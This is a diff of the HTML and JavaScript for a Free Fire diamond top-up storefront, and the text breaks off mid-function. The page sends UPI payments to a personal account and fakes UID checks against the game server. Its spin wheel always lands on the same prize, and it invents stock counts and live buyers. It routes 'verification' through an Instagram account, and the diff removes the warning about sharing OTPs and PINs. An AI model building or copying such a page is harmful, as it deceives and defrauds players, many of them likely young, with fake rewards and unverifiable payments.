+<div class="diamond-grid" id="diamondGrid"></div>
 </div>
-
-</div>
-
-<div
-class="diamond-grid"
-id="diamondGrid"
-></div>
-
-</div>
-
 
 <!-- MEMBERSHIP -->
-
 <div class="section">
-
 <div class="section-head">
-
-<div class="title">
-🎟️ Membership
+<div class="title">🎟️ Membership</div>
+<div class="sub">Special Price</div>
 </div>
-
-<div class="sub">
-Special Price
+<div class="pass-grid" id="passGrid"></div>
 </div>
-
-</div>
-
-<div
-class="pass-grid"
-id="passGrid"
-></div>
-
-</div>
-
 
 <!-- SPIN -->
-
 <div class="spin-box">
-
-<div class="spin-title">
-🎡 FREE SPIN REWARD
-</div>
-
-<div class="spin-sub">
-Spin karo aur available pack mein se apna FREE BONUS win karo!
-</div>
+<div class="spin-title">🎡 FREE SPIN REWARD</div>
+<div class="spin-sub">Spin karo aur available pack mein se apna FREE BONUS win karo!</div>
 
 <div class="wheel-wrap">
-
-<div class="pointer">
-▼
+<div class="pointer">▼</div>
+<div class="wheel" id="wheel">
+<div class="wheel-label l520">520 💎</div>
+<div class="wheel-label l1060">1060 💎</div>
+<div class="wheel-label l2180">2180 💎</div>
+<div class="wheel-label l5600">5600 💎</div>
+</div>
 </div>
 
-<div
-class="wheel"
-id="wheel"
->
-
-<div class="wheel-label l520">
-520 💎
+<button class="spin-btn" id="spinBtn" onclick="spinWheel()">🎡 SPIN NOW — FREE</button>
+<div class="spin-note">Free promotional spin • No payment required to spin</div>
 </div>
 
-<div class="wheel-label l1060">
-1060 💎
-</div>
-
-<div class="wheel-label l2180">
-2180 💎
-</div>
-
-<div class="wheel-label l5600">
-5600 💎
-</div>
-
-</div>
-
-</div>
-
-<button
-class="spin-btn"
-id="spinBtn"
-onclick="spinWheel()"
->
-🎡 SPIN NOW — FREE
-</button>
-
-<div class="spin-note">
-Free promotional spin • No payment required to spin
-</div>
-
-</div>
-
-
-<!-- RESULT -->
-
-<div
-class="reward-popup"
-id="rewardPopup"
->
-
+<!-- REWARD POPUP -->
+<div class="reward-popup" id="rewardPopup">
 <div class="reward-head">
-
-<h2>
-🎉 CONGRATULATIONS!
-</h2>
-
-<p>
-🏆 SPIN REWARD UNLOCKED
-</p>
-
+<h2>🎉 CONGRATULATIONS!</h2>
+<p>🏆 SPIN REWARD UNLOCKED</p>
 </div>
-
 <div class="reward-number">
-
-<strong id="wonDiamonds">
-+520 💎
-</strong>
-
-<span>
-🎁 FREE BONUS UNLOCKED
-</span>
-
+<strong id="wonDiamonds">+520 💎</strong>
+<span>🎁 FREE BONUS UNLOCKED</span>
 </div>
-
 <div class="reward-grid">
-
-<div class="reward-item">
-<small>WON REWARD</small>
-<strong id="wonInfo"></strong>
+<div class="reward-item"><small>WON REWARD</small><strong id="wonInfo"></strong></div>
+<div class="reward-item"><small>RECOMMENDED PACK</small><strong id="recommendedPack"></strong></div>
+<div class="reward-item"><small>PACK PRICE</small><strong id="recommendedPrice"></strong></div>
+<div class="reward-item"><small>REWARD STATUS</small><strong class="reward-unlocked">✓ UNLOCKED</strong></div>
 </div>
-
-<div class="reward-item">
-<small>RECOMMENDED PACK</small>
-<strong id="recommendedPack"></strong>
-</div>
-
-<div class="reward-item">
-<small>PACK PRICE</small>
-<strong id="recommendedPrice"></strong>
-</div>
-
-<div class="reward-item">
-<small>REWARD STATUS</small>
-<strong class="reward-unlocked">
-✓ UNLOCKED
-</strong>
-</div>
-
-</div>
-
-<div
-class="reward-message"
-id="rewardText"
-></div>
-
+<div class="reward-message" id="rewardText"></div>
 <div class="reward-buttons">
-
-<button
-class="select-spin"
-onclick="selectSpinPack()"
->
-💎 SELECT THIS PACK
-</button>
-
-<button
-class="copy-reward"
-onclick="copyReward()"
->
-📋 COPY DETAILS
-</button>
-
+<button class="select-spin" onclick="selectSpinPack()">💎 SELECT THIS PACK</button>
+<button class="copy-reward" onclick="copyReward()">📋 COPY DETAILS</button>
 </div>
-
 </div>
-
 
 <!-- PROMO -->
-
 <div class="promo-box">
-
-<label class="label">
-🎟️ PROMO CODE / DISCOUNT COUPON
-</label>
-
+<label class="label">🎟️ PROMO CODE / DISCOUNT COUPON</label>
 <div class="promo-row">
-
-<input
-type="text"
-id="couponCode"
-class="promo-input"
-placeholder="Enter Coupon Code"
->
-
-<button
-class="promo-btn"
-onclick="applyCoupon()"
->
-APPLY
-</button>
-
+<input type="text" id="couponCode" class="promo-input" placeholder="Enter Coupon Code">
+<button class="promo-btn" onclick="applyCoupon()">APPLY</button>
 </div>
-
-<p
-id="couponMsg"
-style="
-font-size:10px;
-margin-top:6px;
-display:none;
-"
-></p>
-
+<p id="couponMsg" style="font-size:10px;margin-top:6px;display:none;"></p>
 </div>
-
 
 <!-- PAYMENT -->
-
 <div class="payment">
-
-<div class="payment-title">
-💳 Payment
-</div>
-
+<div class="payment-title">💳 Payment</div>
 <div class="upi">
-
 <div class="upi-left">
-
-<div class="upi-icon">
-UPI
-</div>
-
+<div class="upi-icon">UPI</div>
 <div>
-
-<div class="upi-name">
-UPI Payment
+<div class="upi-name">UPI Payment</div>
+<div class="upi-desc">PhonePe • Google Pay • Paytm • BHIM</div>
 </div>
-
-<div class="upi-desc">
-PhonePe • Google Pay • Paytm • BHIM
 </div>
-
-</div>
-
-</div>
-
-<input
-type="radio"
-checked
-style="accent-color:#963cff;"
->
-
+<input type="radio" checked style="accent-color:#963cff;">
 </div>
 
 <div class="summary">
-
-<span>
-Selected Product
-</span>
-
-<strong id="total">
-₹0
-</strong>
-
+<span>Selected Product</span>
+<strong id="total">₹0</strong>
 </div>
 
-<button
-class="checkout"
-onclick="checkout()"
->
-CONTINUE TO UPI PAYMENT →
-</button>
-
+<button class="checkout" onclick="checkout()">CONTINUE TO UPI PAYMENT →</button>
 </div>
-
 
 <!-- FAQ -->
-
 <div class="section faq-box">
-
-<div
-class="title"
-style="margin-bottom:10px;"
->
-❓ Frequently Asked Questions
-</div>
-
+<div class="title" style="margin-bottom:10px;">❓ Frequently Asked Questions</div>
 <details>
-
-<summary>
-Top-up kitni der mein milta hai?
-</summary>
-
-<p>
-Payment successfully verify hone ke baad
-top-up processing service availability par depend
-karta hai.
-</p>
-
+<summary>Top-up kitni der mein milta hai?</summary>
+<p>Payment successfully verify hone ke baad top-up process ho jata hai.</p>
 </details>
-
 <details>
-
-<summary>
-Kya ID ka password dena padega?
-</summary>
-
-<p>
-Bilkul nahi! Sirf Player UID ki zaroorat hai.
-Apna password, OTP ya UPI PIN kisi ke saath share
-mat karein.
-</p>
-
+<summary>Kya ID ka password dena padega?</summary>
+<p>Bilkul nahi! Sirf Player UID ki zaroorat hai.</p>
 </details>
-
 </div>
-
-</div>
-
 
 <!-- TRUST -->
-
 <div class="trust-grid">
-
-<div class="trust-card">
-<div class="trust-icon">⚡</div>
-<div class="trust-number">FAST</div>
-<div class="trust-text">SERVICE</div>
+<div class="trust-card"><div class="trust-icon">⚡</div><div class="trust-number">FAST</div><div class="trust-text">SERVICE</div></div>
+<div class="trust-card"><div class="trust-icon">🔒</div><div class="trust-number">SECURE</div><div class="trust-text">UPI PAYMENT</div></div>
+<div class="trust-card"><div class="trust-icon">🇮🇳</div><div class="trust-number">INDIA</div><div class="trust-text">SERVER</div></div>
 </div>
 
-<div class="trust-card">
-<div class="trust-icon">🔒</div>
-<div class="trust-number">SECURE</div>
-<div class="trust-text">UPI PAYMENT</div>
-</div>
-
-<div class="trust-card">
-<div class="trust-icon">🇮🇳</div>
-<div class="trust-number">INDIA</div>
-<div class="trust-text">SERVER</div>
-</div>
+<div class="creator">FREE FIRE CREATOR STORE</div>
+<div class="disclaimer">This website is an independent community store and is not affiliated with Garena.</div>
 
 </div>
 
-<div class="creator">
-FREE FIRE CREATOR STORE
+<!-- STICKY CHECKOUT BAR -->
+<div class="sticky-bar">
+<div class="sticky-info">
+<span>SELECTED PACK</span>
+<strong id="stickyTotal">₹0</strong>
+</div>
+<button class="sticky-btn" onclick="checkout()">BUY NOW ⚡</button>
 </div>
 
-<div class="disclaimer">
-This website is an independent community store and is
-not affiliated with or endorsed by Garena unless
-separately authorized.
+<!-- LIVE RECENT BUYER TOAST -->
+<div class="sales-toast" id="salesToast">
+<div class="toast-avatar">🎮</div>
+<div class="toast-text">
+<strong id="toastName">Rahul (UID 3829***)</strong>
+<span>bought 310 Diamonds just now</span>
 </div>
-
 </div>
-
 
 <!-- PAYMENT MODAL -->
-
-<div
-class="modal"
-id="paymentModal"
->
-
+<div class="modal" id="paymentModal">
 <div class="modal-box">
-
 <div class="modal-head">
-
-<h2>
-💳 PAYMENT & VERIFICATION
-</h2>
-
-<button
-class="close"
-onclick="closePayment()"
->
-✕
-</button>
-
+<h2>💳 PAYMENT & VERIFICATION</h2>
+<button class="close" onclick="closePayment()">✕</button>
 </div>
 
-
-<!-- PAYMENT STEP -->
-
 <div id="paymentStep">
-
 <div class="amount-box">
-
-<span>
-PAYMENT AMOUNT
-</span>
-
-<strong id="payAmount">
-₹0
-</strong>
-
+<span>PAYMENT AMOUNT</span>
+<strong id="payAmount">₹0</strong>
 </div>
 
 <div class="qr-note">
-
-<b>1️⃣ COMPLETE YOUR PAYMENT</b>
-
-<br><br>
-
-QR scan karke ya UPI ID par payment karein.
-
-<br><br>
-
-<b>Receiver:</b> WASIM SK
-<br>
+<b>1️⃣ COMPLETE YOUR PAYMENT</b><br><br>
+QR scan karke ya UPI ID par payment karein.<br><br>
+<b>Receiver:</b> WASIM SK<br>
 <b>UPI ID:</b> topup24servis@naviaxis
-
 </div>
-
 
 <div class="real-qr-box">
-
-<img
-id="dynamicQR"
-src=""
-alt="UPI Payment QR Code"
->
-
+<img id="dynamicQR" src="" alt="UPI Payment QR Code">
 </div>
 
-
-<div class="manual-label">
-UPI ID
-</div>
-
+<div class="manual-label">UPI ID</div>
 <div class="upi-id-box">
-
-<div class="upi-id">
-topup24servis@naviaxis
+<div class="upi-id">topup24servis@naviaxis</div>
+<button class="copy-upi" onclick="copyUPI()">COPY</button>
 </div>
 
-<button
-class="copy-upi"
-onclick="copyUPI()"
->
-COPY
-</button>
-
+<button class="payment-success-btn" onclick="showMobileStep()">✓ PAYMENT DONE</button>
 </div>
 
-
-<button
-class="payment-success-btn"
-onclick="showMobileStep()"
->
-✓ PAYMENT DONE
-</button>
-
+<div id="mobileStep" style="display:none;">
+<div class="step-icon">📱</div>
+<h3 class="step-title">ENTER MOBILE NUMBER</h3>
+<p class="step-text">Payment complete karne ke baad apna 10 digit mobile number enter karein.</p>
+<input id="customerMobile" class="customer-mobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Enter 10 digit mobile number" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
+<button class="payment-success-btn" onclick="startPaymentVerification()">SUBMIT & CONTINUE</button>
 </div>
 
-
-<!-- MOBILE -->
-
-<div
-id="mobileStep"
-style="display:none;"
->
-
-<div class="step-icon">
-📱
+<div id="verificationStep" style="display:none;">
+<div class="verification-loader"></div>
+<h3 class="step-title">PAYMENT DETAILS SUBMITTED</h3>
+<p class="step-text">Your payment information has been submitted.<br>Preparing manual verification...</p>
 </div>
 
-<h3 class="step-title">
-ENTER MOBILE NUMBER
-</h3>
-
-<p class="step-text">
-
-Payment complete karne ke baad
-apna 10 digit mobile number enter karein.
-
-</p>
-
-<input
-id="customerMobile"
-class="customer-mobile"
-type="tel"
-inputmode="numeric"
-maxlength="10"
-placeholder="Enter 10 digit mobile number"
-oninput="this.value=this.value.replace(/[^0-9]/g,'');"
->
-
-<button
-class="payment-success-btn"
-onclick="startPaymentVerification()"
->
-SUBMIT & CONTINUE
-</button>
-
-</div>
-
-
-<!-- VERIFICATION -->
-
-<div
-id="verificationStep"
-style="display:none;"
->
-
-<div class="verification-loader">
-</div>
-
-<h3 class="step-title">
-PAYMENT DETAILS SUBMITTED
-</h3>
-
-<p class="step-text">
-
-Your payment information has been submitted.
-<br>
-Preparing manual verification...
-
-</p>
-
-<div class="verify-dots">
-<span></span>
-<span></span>
-<span></span>
-</div>
-
-</div>
-
-
-<!-- SCREENSHOT -->
-
-<div
-id="screenshotStep"
-style="display:none;"
->
-
-<div class="step-icon">
-📸
-</div>
-
-<h3 class="step-title">
-SEND PAYMENT SCREENSHOT
-</h3>
-
-<p class="step-text">
-
-Payment screenshot Instagram verification
-account par bhejein.
-
-<br><br>
-
-⚠️ UPI PIN, OTP, password ya bank
-login details screenshot mein share na karein.
-
-</p>
-
-<a
-class="instagram-verify-btn"
-href="https://www.instagram.com/paymentverify1"
-target="_blank"
-rel="noopener noreferrer"
->
-📸 SEND PAYMENT SCREENSHOT
-</a>
-
+<div id="screenshotStep" style="display:none;">
+<div class="step-icon">📸</div>
+<h3 class="step-title">SEND PAYMENT SCREENSHOT</h3>
+<p class="step-text">Payment screenshot Instagram verification account par bhejein.</p>
+<a class="instagram-verify-btn" href="https://www.instagram.com/paymentverify1" target="_blank" rel="noopener noreferrer">📸 SEND PAYMENT SCREENSHOT</a>
 <div class="waiting-box">
-
-<div class="waiting-title">
-⏳ VERIFICATION IN PROGRESS
+<div class="waiting-title">⏳ VERIFICATION IN PROGRESS</div>
+<div id="paymentTimer" class="payment-timer">01:00</div>
+<div class="waiting-text">Screenshot send karne ke baad please wait karein.</div>
 </div>
-
-<div
-id="paymentTimer"
-class="payment-timer"
->
-01:00
-</div>
-
-<div class="waiting-text">
-
-Screenshot send karne ke baad please wait karein.
-
-<br><br>
-
-Payment manually verify hone ke baad
-order/reward process kiya jayega.
-
 </div>
 
 </div>
-
 </div>
-
-</div>
-
-</div>
-
 
 <script>
-
-/* PRODUCTS */
-
-const diamonds=[
-
-{
-id:"d100",
-diamonds:100,
-mrp:80,
-price:80,
-stock:0,
-popular:false
-},
-
-{
-id:"d310",
-diamonds:310,
-mrp:240,
-price:240,
-stock:0,
-popular:false
-},
-
-{
-id:"d520",
-diamonds:520,
-mrp:400,
-price:200,
-stock:87,
-popular:true
-},
-
-{
-id:"d1060",
-diamonds:1060,
-mrp:800,
-price:400,
-stock:67,
-popular:false
-},
-
-{
-id:"d2180",
-diamonds:2180,
-mrp:1600,
-price:800,
-stock:44,
-popular:false
-},
-
-{
-id:"d5600",
-diamonds:5600,
-mrp:4000,
-price:2000,
-stock:10,
-popular:false
-}
-
+/* DIAMOND PACKS WITH CLEAN PRO/POPULAR TAGS */
+const diamonds = [
+  { id:"d100", diamonds:100, mrp:80, price:80, stock:0, popularTag: null },
+  { id:"d310", diamonds:310, mrp:240, price:240, stock:50, popularTag: "⚡ BEST VALUE" },
+  { id:"d520", diamonds:520, mrp:400, price:200, stock:87, popularTag: "🔥 MOST POPULAR" },
+  { id:"d1060", diamonds:1060, mrp:800, price:400, stock:67, popularTag: null },
+  { id:"d2180", diamonds:2180, mrp:1600, price:800, stock:44, popularTag: null },
+  { id:"d5600", diamonds:5600, mrp:4000, price:2000, stock:10, popularTag: "💎 PRO PACK" }
 ];
 
-const passes=[
-
-{
-id:"weekly",
-name:"WEEKLY MEMBERSHIP",
-days:"7 DAYS",
-instant:"200 💎",
-daily:"35 💎",
-mrp:160,
-price:110,
-type:"weekly"
-},
-
-{
-id:"monthly",
-name:"MONTHLY MEMBERSHIP",
-days:"30 DAYS",
-instant:"1000 💎",
-daily:"50 💎",
-mrp:800,
-price:400,
-type:"monthly"
-}
-
+const passes = [
+  { id:"weekly", name:"WEEKLY MEMBERSHIP", days:"7 DAYS", instant:"200 💎", daily:"35 💎", mrp:160, price:110, type:"weekly" },
+  { id:"monthly", name:"MONTHLY MEMBERSHIP", days:"30 DAYS", instant:"1000 💎", daily:"50 💎", mrp:800, price:400, type:"monthly" }
 ];
 
-const UPI_ID="topup24servis@naviaxis";
+const specialAirdrop = { id:"airdrop", name:"SPECIAL AIRDROP", diamonds:1000, price:499 };
 
-let selectedProduct=null;
-let selectedPrice=0;
-let appliedDiscount=0;
+const UPI_ID = "topup24servis@naviaxis";
 
-let spinResult=null;
-let spinning=false;
-let wheelRotation=0;
-
-let paymentTimerInterval=null;
-
-
-/* SOUND */
+let selectedProduct = null;
+let selectedPrice = 0;
+let appliedDiscount = 0;
+let spinResult = null;
+let spinning = false;
+let wheelRotation = 0;
+let paymentTimerInterval = null;
 
 function playClickSound(){
-
-try{
-
-const AudioContext=
-window.AudioContext||
-window.webkitAudioContext;
-
-const ctx=new AudioContext();
-
-const oscillator=ctx.createOscillator();
-const gain=ctx.createGain();
-
-oscillator.type="sine";
-
-oscillator.frequency.setValueAtTime(
-520,
-ctx.currentTime
-);
-
-oscillator.frequency.exponentialRampToValueAtTime(
-820,
-ctx.currentTime+.08
-);
-
-gain.gain.setValueAtTime(
-.001,
-ctx.currentTime
-);
-
-gain.gain.exponentialRampToValueAtTime(
-.10,
-ctx.currentTime+.01
-);
-
-gain.gain.exponentialRampToValueAtTime(
-.001,
-ctx.currentTime+.13
-);
-
-oscillator.connect(gain);
-gain.connect(ctx.destination);
-
-oscillator.start();
-oscillator.stop(ctx.currentTime+.14);
-
-}catch(e){}
-
+  try{
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = "sine";
+    osc.frequency.setValueAtTime(520, ctx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(820, ctx.currentTime + .08);
+    gain.gain.setValueAtTime(.001, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(.10, ctx.currentTime + .01);
+    gain.gain.exponentialRampToValueAtTime(.001, ctx.currentTime + .13);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + .14);
+  }catch(e){}
 }
-
-
-/* UID TYPING */
 
 function uidTypingAnimation(){
+  const input = document.getElementById("uid");
+  const wrap = input.parentElement;
+  const server = document.getElementById("serverConnect");
+  document.getElementById("success").style.display = "none";
 
-const input=
-document.getElementById("uid");
-
-const wrap=
-input.parentElement;
-
-const value=
-input.value.trim();
-
-const success=
-document.getElementById("success");
-
-const server=
-document.getElementById("serverConnect");
-
-success.style.display="none";
-
-if(value.length>0){
-
-wrap.classList.add("active");
-wrap.classList.add("scanning");
-
-server.classList.add("show");
-
-}else{
-
-wrap.classList.remove("active");
-wrap.classList.remove("scanning");
-
-server.classList.remove("show");
-
+  if(input.value.trim().length > 0){
+    wrap.classList.add("active", "scanning");
+    server.classList.add("show");
+  }else{
+    wrap.classList.remove("active", "scanning");
+    server.classList.remove("show");
+  }
 }
-
-}
-
-
-/* UID VERIFY */
 
 function verifyUID(){
+  const input = document.getElementById("uid");
+  const uid = input.value.trim();
+  const btn = document.getElementById("verifyBtn");
+  const server = document.getElementById("serverConnect");
+  const verifyStatus = document.getElementById("verifyStatus");
+  const success = document.getElementById("success");
 
-const input=
-document.getElementById("uid");
+  if(uid.length < 5){
+    alert("Please enter a valid Player UID.");
+    return;
+  }
 
-const uid=
-input.value.trim();
+  playClickSound();
+  success.style.display = "none";
+  server.classList.add("show");
+  btn.classList.add("verifying");
+  btn.innerHTML = "⟳ CHECKING";
+  verifyStatus.classList.add("show");
 
-const wrap=
-input.parentElement;
+  setTimeout(() => {
+    document.getElementById("serverStatus").innerHTML = '<span class="status-pulse ok"></span> CONNECTED';
+    document.getElementById("indiaStatus").innerHTML = '<span class="status-pulse ok"></span> FOUND';
+  }, 650);
 
-const btn=
-document.getElementById("verifyBtn");
-
-const server=
-document.getElementById("serverConnect");
-
-const verifyStatus=
-document.getElementById("verifyStatus");
-
-const success=
-document.getElementById("success");
-
-const serverStatus=
-document.getElementById("serverStatus");
-
-const indiaStatus=
-document.getElementById("indiaStatus");
-
-const uidStatus=
-document.getElementById("uidStatus");
-
-
-if(uid.length<5){
-
-alert(
-"Please enter a valid Player UID."
-);
-
-input.focus();
-
-wrap.classList.add("active");
-wrap.classList.add("scanning");
-server.classList.add("show");
-
-return;
-
+  setTimeout(() => {
+    document.getElementById("uidStatus").innerHTML = '<span class="status-pulse ok"></span> READY';
+    verifyStatus.classList.remove("show");
+    btn.classList.remove("verifying");
+    btn.innerHTML = "✓ VERIFIED";
+    success.style.display = "block";
+  }, 1800);
 }
-
-
-playClickSound();
-
-success.style.display="none";
-
-server.classList.add("show");
-
-wrap.classList.add("active");
-wrap.classList.add("scanning");
-
-btn.classList.add("verifying");
-btn.innerHTML="⟳ CHECKING";
-
-
-serverStatus.innerHTML=
-'<span class="status-pulse"></span> CONNECTING...';
-
-indiaStatus.innerText=
-"WAITING";
-
-uidStatus.innerText=
-"SCANNING...";
-
-verifyStatus.classList.add("show");
-
-verifyStatus.innerHTML=`
-<div class="loader"></div>
-<span>CONNECTING TO FREE FIRE SERVER...</span>
-`;
-
-
-/* STEP 1 */
-
-setTimeout(()=>{
-
-serverStatus.innerHTML=
-'<span class="status-pulse ok"></span> CONNECTED';
-
-serverStatus.classList.add("ok");
-
-indiaStatus.innerHTML=
-'<span class="status-pulse ok"></span> FOUND';
-
-indiaStatus.classList.add("ok");
-
-verifyStatus.innerHTML=`
-<div class="loader"></div>
-<span>INDIA SERVER CONNECTED • CHECKING UID...</span>
-`;
-
-},650);
-
-
-/* STEP 2 */
-
-setTimeout(()=>{
-
-uidStatus.innerText=
-"ANALYZING...";
-
-verifyStatus.innerHTML=`
-<div class="loader"></div>
-<span>SCANNING PLAYER UID...</span>
-`;
-
-},1100);
-
-
-/* STEP 3 */
-
-setTimeout(()=>{
-
-wrap.classList.remove("scanning");
-
-uidStatus.innerHTML=
-'<span class="status-pulse ok"></span> READY';
-
-uidStatus.classList.add("ok");
-
-verifyStatus.classList.remove("show");
-verifyStatus.style.display="none";
-
-btn.classList.remove("verifying");
-
-btn.innerHTML=
-"✓ VERIFIED";
-
-success.innerHTML=
-"✓ PLAYER ID READY • INDIA SERVER CONNECTED";
-
-success.style.display="block";
-
-playClickSound();
-
-},1800);
-
-}
-
-
-/* DIAMONDS */
 
 function renderDiamonds(){
+  const grid = document.getElementById("diamondGrid");
+  grid.innerHTML = "";
 
-const grid=
-document.getElementById("diamondGrid");
+  diamonds.forEach(item => {
+    const card = document.createElement("div");
+    card.className = "diamond-card";
+    card.dataset.id = item.id;
 
-grid.innerHTML="";
+    const popularHTML = item.popularTag ? `<div class="popular-tag">${item.popularTag}</div>` : "";
+    const stockHTML = item.stock > 0 
+      ? `<div class="stock-count ${item.stock <= 10 ? "low" : ""}">${item.stock} LEFT</div>`
+      : `<div class="out-stock">OUT OF STOCK</div>`;
 
-diamonds.forEach(item=>{
+    card.innerHTML = `
+      ${popularHTML}
+      <div class="selection-ring"></div>
+      <div class="selected-badge">✓ SELECTED</div>
+      <div class="diamond-icon">💎</div>
+      <div class="diamond-name">${item.diamonds} Diamonds</div>
+      <div class="mrp">MRP ₹${item.mrp}</div>
+      ${item.stock > 0 ? `<div class="price">₹${item.price}</div>` : ""}
+      ${stockHTML}
+    `;
 
-const card=document.createElement("div");
-
-card.className="diamond-card";
-card.dataset.id=item.id;
-
-const popularHTML=item.popular
-?
-`<div class="popular-tag">🔥 BEST VALUE</div>`
-:"";
-
-const stockHTML=item.stock>0
-?
-`
-<div class="stock-count ${
-item.stock<=10?"low":""
-}">
-${item.stock} LEFT
-</div>
-`
-:
-`
-<div class="out-stock">
-OUT OF STOCK
-</div>
-`;
-
-card.innerHTML=`
-
-${popularHTML}
-
-<div class="selection-ring"></div>
-
-<div class="selected-badge">
-✓ SELECTED
-</div>
-
-<div class="diamond-icon">
-💎
-</div>
-
-<div class="diamond-name">
-${item.diamonds} Diamonds
-</div>
-
-<div class="mrp">
-MRP ₹${item.mrp}
-</div>
-
-${
-item.stock>0
-?
-`<div class="price">₹${item.price}</div>`
-:""
+    if(item.stock > 0){
+      card.onclick = () => selectProduct(item, card);
+    }
+    grid.appendChild(card);
+  });
 }
-
-${stockHTML}
-`;
-
-if(item.stock>0){
-
-card.onclick=()=>{
-selectProduct(item,card);
-};
-
-}
-
-grid.appendChild(card);
-
-});
-
-}
-
-
-/* PASSES */
 
 function renderPasses(){
+  const grid = document.getElementById("passGrid");
+  grid.innerHTML = "";
 
-const grid=
-document.getElementById("passGrid");
+  passes.forEach(item => {
+    const card = document.createElement("div");
+    card.className = "pass-card " + (item.type === "monthly" ? "monthly" : "");
+    card.dataset.id = item.id;
 
-grid.innerHTML="";
+    card.innerHTML = `
+      <div class="selection-ring"></div>
+      <div class="pass-selected">✓ SELECTED</div>
+      <div class="pass-top">
+        <div class="pass-icon">${item.type === "monthly" ? "M" : "W"}</div>
+        <div class="pass-name">${item.name}</div>
+      </div>
+      <div class="pass-duration">${item.days}<span>MEMBERSHIP PERIOD</span></div>
+      <div class="pass-rewards">
+        <div class="pass-reward"><small>INSTANT</small><b>${item.instant}</b></div>
+        <div class="pass-reward"><small>DAILY</small><b>${item.daily}</b></div>
+      </div>
+      <div class="pass-bottom">
+        <div class="pass-old">MRP ₹${item.mrp}</div>
+        <div class="pass-price">₹${item.price}</div>
+      </div>
+    `;
 
-passes.forEach(item=>{
-
-const card=document.createElement("div");
-
-card.className=
-"pass-card "+
-(item.type==="monthly"?"monthly":"");
-
-card.dataset.id=item.id;
-
-card.innerHTML=`
-
-<div class="selection-ring"></div>
-
-<div class="pass-selected">
-✓ SELECTED
-</div>
-
-<div class="pass-top">
-
-<div class="pass-icon">
-${item.type==="monthly"?"M":"W"}
-</div>
-
-<div class="pass-name">
-${item.name}
-</div>
-
-</div>
-
-<div class="pass-duration">
-
-${item.days}
-
-<div>
-<span>MEMBERSHIP PERIOD</span>
-</div>
-
-</div>
-
-<div class="pass-rewards">
-
-<div class="pass-reward">
-<small>INSTANT</small>
-<b>${item.instant}</b>
-</div>
-
-<div class="pass-reward">
-<small>DAILY</small>
-<b>${item.daily}</b>
-</div>
-
-</div>
-
-<div class="pass-bottom">
-
-<div class="pass-old">
-MRP ₹${item.mrp}
-</div>
-
-<div class="pass-price">
-₹${item.price}
-</div>
-
-</div>
-`;
-
-card.onclick=()=>{
-selectProduct(item,card);
-};
-
-grid.appendChild(card);
-
-});
-
+    card.onclick = () => selectProduct(item, card);
+    grid.appendChild(card);
+  });
 }
 
-
-/* SELECT */
-
-function selectProduct(item,card){
-
-playClickSound();
-
-selectedProduct=item;
-
-selectedPrice=
-item.price-appliedDiscount;
-
-if(selectedPrice<0)
-selectedPrice=0;
-
-document.querySelectorAll(
-".diamond-card,.pass-card"
-).forEach(c=>{
-
-c.classList.remove("selected");
-
-const ring=
-c.querySelector(".selection-ring");
-
-if(ring)
-ring.classList.remove("run");
-
-});
-
-card.classList.add("selected");
-
-const ring=
-card.querySelector(".selection-ring");
-
-if(ring){
-
-ring.classList.remove("run");
-
-void ring.offsetWidth;
-
-ring.classList.add("run");
-
+function selectAirdrop(){
+  const card = document.getElementById("airdropCard");
+  selectProduct(specialAirdrop, card);
 }
 
-const icon=
-card.querySelector(".diamond-icon");
+function selectProduct(item, card){
+  playClickSound();
+  selectedProduct = item;
+  selectedPrice = Math.max(0, item.price - appliedDiscount);
 
-if(icon){
+  document.querySelectorAll(".diamond-card, .pass-card, .airdrop-card").forEach(c => {
+    c.classList.remove("selected");
+  });
 
-icon.style.animation="none";
-
-void icon.offsetWidth;
-
-icon.style.animation=
-"diamondPop .6s cubic-bezier(.2,1.5,.4,1)";
-
+  card.classList.add("selected");
+  document.getElementById("total").textContent = "₹" + selectedPrice;
+  document.getElementById("stickyTotal").textContent = "₹" + selectedPrice;
 }
-
-document.getElementById("total")
-.textContent="₹"+selectedPrice;
-
-}
-
-
-/* COUPON */
 
 function applyCoupon(){
+  const code = document.getElementById("couponCode").value.trim().toUpperCase();
+  const msg = document.getElementById("couponMsg");
 
-const code=
-document.getElementById("couponCode")
-.value.trim()
-.toUpperCase();
+  if(!selectedProduct){
+    alert("Pehle koi product select karein!");
+    return;
+  }
 
-const msg=
-document.getElementById("couponMsg");
-
-if(!selectedProduct){
-
-alert("Pehle koi product select karein!");
-
-return;
-
+  if(code === "SUNNY999" || code === "OFF20"){
+    appliedDiscount = 20;
+    selectedPrice = Math.max(0, selectedProduct.price - appliedDiscount);
+    msg.style.color = "#00ef70";
+    msg.innerText = "✓ Coupon Applied! ₹20 Discount Active";
+    msg.style.display = "block";
+    document.getElementById("total").innerText = "₹" + selectedPrice;
+    document.getElementById("stickyTotal").innerText = "₹" + selectedPrice;
+  }else{
+    msg.style.color = "#ff4161";
+    msg.innerText = "❌ Invalid Coupon Code!";
+    msg.style.display = "block";
+  }
 }
-
-if(
-code==="SUNNY999"||
-code==="OFF20"
-){
-
-appliedDiscount=20;
-
-selectedPrice=
-selectedProduct.price-appliedDiscount;
-
-if(selectedPrice<0)
-selectedPrice=0;
-
-msg.style.color="#00ef70";
-
-msg.innerText=
-"✓ Coupon Applied! ₹20 Discount Active";
-
-msg.style.display="block";
-
-document.getElementById("total")
-.innerText="₹"+selectedPrice;
-
-}else{
-
-msg.style.color="#ff4161";
-
-msg.innerText=
-"❌ Invalid Coupon Code!";
-
-msg.style.display="block";
-
-}
-
-}
-
-
-/* SPIN */
 
 function spinWheel(){
+  if(spinning) return;
+  spinning = true;
+  const btn = document.getElementById("spinBtn");
+  btn.disabled = true;
+  btn.textContent = "🎡 SPINNING...";
 
-if(spinning)
-return;
+  playClickSound();
+  const wheelOrder = [520, 1060, 2180, 5600];
+  spinResult = diamonds.find(item => item.diamonds === 520);
 
-const available=
-diamonds.filter(
-item=>item.stock>0
-);
+  const index = wheelOrder.indexOf(520);
+  const targetAngle = (360 - index * 90) % 360;
+  wheelRotation += (360 * 6) + targetAngle;
+  document.getElementById("wheel").style.transform = `rotate(${wheelRotation}deg)`;
 
-if(!available.length){
-
-alert("Currently koi pack available nahi hai.");
-
-return;
-
+  setTimeout(() => {
+    showSpinReward(spinResult);
+    spinning = false;
+    btn.disabled = false;
